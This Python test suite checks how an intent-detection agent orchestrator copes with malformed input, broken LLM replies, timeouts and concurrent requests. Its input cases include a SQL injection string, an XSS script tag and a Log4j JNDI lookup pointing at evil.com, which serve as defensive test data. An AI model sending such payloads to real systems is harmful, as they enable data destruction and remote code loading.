"""
Test suite for error recovery and edge cases in intent understanding.

Tests system behavior with malformed inputs, errors, and extreme edge cases.
"""

import asyncio
import pytest
import json
from typing import Dict, List, Any, Optional
from unittest.mock import patch, MagicMock

from adk_main import ADKAgentOrchestrator
from models import Conversation, WorkflowStep
from utils.config import Config


def get_malformed_input_test_cases() -> List[Dict[str, Any]]:
    """Test cases with malformed or problematic inputs."""
    
    return [
        # Empty and whitespace
        {
            "message": "",
            "expected_intent": "unclear",
            "category": "empty_string",
            "should_handle_gracefully": True
        },
        {
            "message": "   ",
            "expected_intent": "unclear",
            "category": "whitespace_only",
            "should_handle_gracefully": True
        },
        {
            "message": "\n\n\n",
            "expected_intent": "unclear",
            "category": "newlines_only",
            "should_handle_gracefully": True
        },
        {
            "message": "\t\t\t",
            "expected_intent": "unclear",
            "category": "tabs_only",
            "should_handle_gracefully": True
        },
        
        # Special characters
        {
            "message": "!@#$%^&*()",
            "expected_intent": "unclear",
            "category": "special_chars_only",
            "should_handle_gracefully": True
        },
        {
            "message": "```python\nprint('hello')\n```",
            "expected_intent": "unclear",
            "category": "code_block",
            "should_handle_gracefully": True
        },
        {
            "message": "\\x00\\x01\\x02",
            "expected_intent": "unclear",
            "category": "control_characters",
            "should_handle_gracefully": True
        },
        
        # Extreme lengths
        {
            "message": "a" * 10000,
            "expected_intent": "unclear",
            "category": "extremely_long",
            "should_handle_gracefully": True
        },
        {
            "message": "create ICP " * 1000,
            "expected_intent": "request_icp_creation",
            "category": "repetitive_long",
            "should_handle_gracefully": True
        },
        
        # Unicode and emojis
        {
            "message": "创建客户档案",  # Chinese: "Create customer profile"
            "expected_intent": "unclear",  # System may not handle non-English
            "category": "unicode_chinese",
            "should_handle_gracefully": True
        },
        {
            "message": "🏢💼📊 ICP",
            "expected_intent": "unclear",
            "category": "emoji_heavy",
            "should_handle_gracefully": True
        },
        {
            "message": "I need an ICP 🚀🚀🚀 ASAP!!!",
            "expected_intent": "request_icp_creation",
            "category": "emoji_mixed_text",
            "should_handle_gracefully": True
        },
        
        # Potential injection attempts
        {
            "message": "'; DROP TABLE users; --",
            "expected_intent": "unclear",
            "category": "sql_injection_attempt",
            "should_handle_gracefully": True
        },
        {
            "message": "<script>alert('xss')</script>",
            "expected_intent": "unclear",
            "category": "xss_attempt",
            "should_handle_gracefully": True
        },
        {
            "message": "${jndi:ldap://evil.com/a}",
            "expected_intent": "unclear",
            "category": "log4j_attempt",
            "should_handle_gracefully": True
        },
        
        # JSON-like content
        {
            "message": '{"intent": "request_icp_creation", "confidence": 1.0}',
            "expected_intent": "unclear",
            "category": "json_input",
            "should_handle_gracefully": True
        },
        {
            "message": "{'message': 'create ICP'}",
            "expected_intent": "unclear",
            "category": "dict_string",
            "should_handle_gracefully": True
        },
        
        # Mixed encoding issues
        {
            "message": "create an ICP\x00 please",
            "expected_intent": "request_icp_creation",
            "category": "null_byte_embedded",
            "should_handle_gracefully": True
        },
        {
            "message": "I need prospects\r\nfind them",
            "expected_intent": "find_prospects",
            "category": "mixed_line_endings",
            "should_handle_gracefully": True
        }
    ]


def get_llm_failure_scenarios() -> List[Dict[str, Any]]:
    """Scenarios where LLM might fail or return unexpected results."""
    
    return [
        # Responses that might break JSON parsing
        {
            "mock_response": "I think the intent is request_icp_creation",
            "message": "create an ICP",
            "should_fallback": True,
            "category": "non_json_response"
        },
        {
            "mock_response": '{"intent_type": "request_icp_creation"',  # Incomplete JSON
            "message": "create an ICP",
            "should_fallback": True,
            "category": "incomplete_json"
        },
        {
            "mock_response": '{"wrong_field": "value"}',  # Missing required fields
            "message": "create an ICP",
            "should_fallback": True,
            "category": "missing_fields"
        },
        {
            "mock_response": '{"intent_type": null, "confidence": null}',
            "message": "create an ICP",
            "should_fallback": True,
            "category": "null_values"
        },
        {
            "mock_response": '{"intent_type": "invalid_intent_name", "confidence": 0.9}',
            "message": "create an ICP",
            "should_fallback": False,  # Should handle unknown intent types
            "category": "invalid_intent_type"
        },
        {
            "mock_response": '{"intent_type": "request_icp_creation", "confidence": "high"}',  # Wrong type
            "message": "create an ICP",
            "should_fallback": True,
            "category": "wrong_confidence_type"
        }
    ]


def get_timeout_and_performance_cases() -> List[Dict[str, Any]]:
    """Test cases for timeout and performance scenarios."""
    
    return [
        {
            "message": "create an ICP",
            "delay_seconds": 5,
            "should_timeout": False,  # Should handle reasonable delays
            "category": "slow_response"
        },
        {
            "message": "find prospects",
            "delay_seconds": 30,
            "should_timeout": True,  # Should timeout on very long delays
            "category": "timeout_scenario"
        },
        {
            "message": "hi " * 1000,  # Large message
            "delay_seconds": 0,
            "should_timeout": False,
            "category": "large_message_processing"
        }
    ]


def get_concurrent_request_cases() -> List[Dict[str, Any]]:
    """Test cases for concurrent request handling."""
    
    return [
        {
            "messages": [
                "create an ICP",
                "find prospects",
                "what's an ICP?",
                "my company is TechCorp",
                "analyze example.com"
            ],
            "concurrent_count": 5,
            "category": "multiple_concurrent"
        },
        {
            "messages": ["create ICP"] * 10,
            "concurrent_count": 10,
            "category": "same_message_concurrent"
        }
    ]


class ErrorRecoveryTester:
    """Tests error recovery and edge cases."""
    
    def __init__(self):
        self.config = Config.load_from_file()
        self.orchestrator = ADKAgentOrchestrator(self.config)
        self.test_results = []
    
    async def test_malformed_input(
        self,
        test_case: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Test handling of malformed input."""
        
        conversation_id = await self.orchestrator.start_conversation("error_test")
        conversation = self.orchestrator.conversations[conversation_id]
        
        error_occurred = False
        intent = None
        
        try:
            intent = await self.orchestrator._analyze_user_intent(
                test_case["message"],
                conversation,
                []
            )
        except Exception as e:
            error_occurred = True
            intent = {"intent_type": "error", "error": str(e)}
        
        # Success means it handled gracefully without crashing
        success = (not error_occurred) and test_case["should_handle_gracefully"]
        
        result = {
            "message": test_case["message"][:100] if len(test_case["message"]) > 100 else test_case["message"],
            "message_length": len(test_case["message"]),
            "category": test_case["category"],
            "error_occurred": error_occurred,
            "detected_intent": intent.get("intent_type") if intent else "error",
            "expected_intent": test_case["expected_intent"],
            "success": success
        }
        
        self.test_results.append(result)
        return result
    
    async def test_llm_failure(
        self,
        test_case: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Test handling of LLM failures."""
        
        conversation_id = await self.orchestrator.start_conversation("llm_error_test")
        conversation = self.orchestrator.conversations[conversation_id]
        
        # Mock the LLM response
        with patch.object(
            self.orchestrator.research_agent, 
            'process_json_request',
            return_value=test_case["mock_response"]
        ):
            try:
                intent = await self.orchestrator._analyze_user_intent(
                    test_case["message"],
                    conversation,
                    []
                )
                error_occurred = False
                used_fallback = intent.get("intent_type") == "unclear" and intent.get("confidence", 1.0) < 0.5
            except Exception as e:
                error_occurred = True
                used_fallback = False
                intent = {"intent_type": "error", "error": str(e)}
        
        success = (test_case["should_fallback"] and used_fallback) or \
                  (not test_case["should_fallback"] and not error_occurred)
        
        result = {
            "message": test_case["message"],
            "category": test_case["category"],
            "mock_response": test_case["mock_response"][:100],
            "error_occurred": error_occurred,
            "used_fallback": used_fallback,
            "detected_intent": intent.get("intent_type") if intent else "error",
            "success": success
        }
        
        self.test_results.append(result)
        return result
    
    async def test_timeout_scenario(
        self,
        test_case: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Test timeout handling."""
        
        conversation_id = await self.orchestrator.start_conversation("timeout_test")
        conversation = self.orchestrator.conversations[conversation_id]
        
        # Mock slow response
        async def slow_response(*args, **kwargs):
            await asyncio.sleep(test_case["delay_seconds"])
            return json.dumps({
                "intent_type": "request_icp_creation",
                "confidence": 0.9
            })
        
        with patch.object(
            self.orchestrator.research_agent,
            'process_json_request',
            side_effect=slow_response
        ):
            start_time = asyncio.get_event_loop().time()
            
            try:
                # Use asyncio.wait_for for timeout
                intent = await asyncio.wait_for(
                    self.orchestrator._analyze_user_intent(
                        test_case["message"],
                        conversation,
                        []
                    ),
                    timeout=10.0  # 10 second timeout
                )
                timed_out = False
                error_occurred = False
            except asyncio.TimeoutError:
                timed_out = True
                error_occurred = False
                intent = {"intent_type": "timeout"}
            except Exception as e:
                timed_out = False
                error_occurred = True
                intent = {"intent_type": "error", "error": str(e)}
            
            elapsed_time = asyncio.get_event_loop().time() - start_time
        
        success = (test_case["should_timeout"] and timed_out) or \
                  (not test_case["should_timeout"] and not timed_out and not error_occurred)
        
        result = {
            "message": test_case["message"][:50],
            "category": test_case["category"],
            "delay_seconds": test_case["delay_seconds"],
            "elapsed_time": elapsed_time,
            "timed_out": timed_out,
            "error_occurred": error_occurred,
            "success": success
        }
        
        self.test_results.append(result)
        return result
    
    async def test_concurrent_requests(
        self,
        test_case: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Test concurrent request handling."""
        
        tasks = []
        
        for message in test_case["messages"]:
            conversation_id = await self.orchestrator.start_conversation(f"concurrent_test_{len(tasks)}")
            conversation = self.orchestrator.conversations[conversation_id]
            
            task = self.orchestrator._analyze_user_intent(
                message,
                conversation,
                []
            )
            tasks.append(task)
        
        # Run all tasks concurrently
        start_time = asyncio.get_event_loop().time()
        
        try:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            elapsed_time = asyncio.get_event_loop().time() - start_time
            
            errors = [r for r in results if isinstance(r, Exception)]
            success_count = len([r for r in results if not isinstance(r, Exception)])
            
            success = len(errors) == 0
            
        except Exception as e:
            success = False
            errors = [e]
            success_count = 0
            elapsed_time = asyncio.get_event_loop().time() - start_time
        
        result = {
            "category": test_case["category"],
            "concurrent_count": test_case["concurrent_count"],
            "success_count": success_count,
            "error_count": len(errors),
            "elapsed_time": elapsed_time,
            "avg_time_per_request": elapsed_time / test_case["concurrent_count"],
            "success": success
        }
        
        self.test_results.append(result)
        return result


@pytest.mark.asyncio
async def test_error_recovery():
    """Test error recovery and edge cases."""
    
    tester = ErrorRecoveryTester()
    
    print("\n=== ERROR RECOVERY & EDGE CASE TESTS ===\n")
    
    # Test malformed inputs
    print("Testing malformed inputs...")
    malformed_cases = get_malformed_input_test_cases()
    malformed_results = {"success": 0, "total": 0}
    
    for test_case in malformed_cases:
        result = await tester.test_malformed_input(test_case)
        malformed_results["total"] += 1
        if result["success"]:
            malformed_results["success"] += 1
        
        status = "✓" if result["success"] else "✗"
        print(f"{status} {result['category']}: {result['detected_intent']} (len: {result['message_length']})")
    
    # Test LLM failures
    print("\nTesting LLM failure scenarios...")
    llm_failure_cases = get_llm_failure_scenarios()
    llm_results = {"success": 0, "total": 0}
    
    for test_case in llm_failure_cases:
        result = await tester.test_llm_failure(test_case)
        llm_results["total"] += 1
        if result["success"]:
            llm_results["success"] += 1
        
        status = "✓" if result["success"] else "✗"
        print(f"{status} {result['category']}: fallback={result['used_fallback']}, error={result['error_occurred']}")
    
    # Test timeout scenarios
    print("\nTesting timeout scenarios...")
    timeout_cases = get_timeout_and_performance_cases()
    timeout_results = {"success": 0, "total": 0}
    
    for test_case in timeout_cases:
        result = await tester.test_timeout_scenario(test_case)
        timeout_results["total"] += 1
        if result["success"]:
            timeout_results["success"] += 1
        
        status = "✓" if result["success"] else "✗"
        print(f"{status} {result['category']}: {result['elapsed_time']:.2f}s, timed_out={result['timed_out']}")
    
    # Test concurrent requests
    print("\nTesting concurrent request handling...")
    concurrent_cases = get_concurrent_request_cases()
    concurrent_results = {"success": 0, "total": 0}
    
    for test_case in concurrent_cases:
        result = await tester.test_concurrent_requests(test_case)
        concurrent_results["total"] += 1
        if result["success"]:
            concurrent_results["success"] += 1
        
        status = "✓" if result["success"] else "✗"
        print(f"{status} {result['category']}: {result['success_count']}/{result['concurrent_count']} succeeded in {result['elapsed_time']:.2f}s")
    
    # Summary
    print("\n=== SUMMARY ===")
    print(f"Malformed Inputs: {malformed_results['success']}/{malformed_results['total']} ({malformed_results['success']/malformed_results['total']*100:.1f}%)")
    print(f"LLM Failures: {llm_results['success']}/{llm_results['total']} ({llm_results['success']/llm_results['total']*100:.1f}%)")
    print(f"Timeout Handling: {timeout_results['success']}/{timeout_results['total']} ({timeout_results['success']/timeout_results['total']*100:.1f}%)")
    print(f"Concurrent Requests: {concurrent_results['success']}/{concurrent_results['total']} ({concurrent_results['success']/concurrent_results['total']*100:.1f}%)")
    
    total_tests = sum(r["total"] for r in [malformed_results, llm_results, timeout_results, concurrent_results])
    total_success = sum(r["success"] for r in [malformed_results, llm_results, timeout_results, concurrent_results])
    overall_success_rate = (total_success / total_tests * 100) if total_tests > 0 else 0
    
    print(f"\nOverall: {total_success}/{total_tests} ({overall_success_rate:.1f}%)")
    
    # Save results
    import json
    from datetime import datetime
    
    results_data = {
        "test_type": "error_recovery",
        "timestamp": datetime.now().isoformat(),
        "summary": {
            "total_tests": total_tests,
            "successful_tests": total_success,
            "success_rate": overall_success_rate,
            "by_category": {
                "malformed_inputs": malformed_results,
                "llm_failures": llm_results,
                "timeout_handling": timeout_results,
                "concurrent_requests": concurrent_results
            }
        },
        "test_results": tester.test_results
    }
    
    filename = f"error_recovery_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, 'w') as f:
        json.dump(results_data, f, indent=2)
    
    print(f"\nDetailed results saved to: {filename}")
    
    # Assert high success rate for error recovery
    min_success_rate = 90.0  # Should handle errors gracefully
    assert overall_success_rate >= min_success_rate, \
        f"Error recovery success rate {overall_success_rate:.1f}% below minimum {min_success_rate}%"


if __name__ == "__main__":
    asyncio.run(test_error_recovery())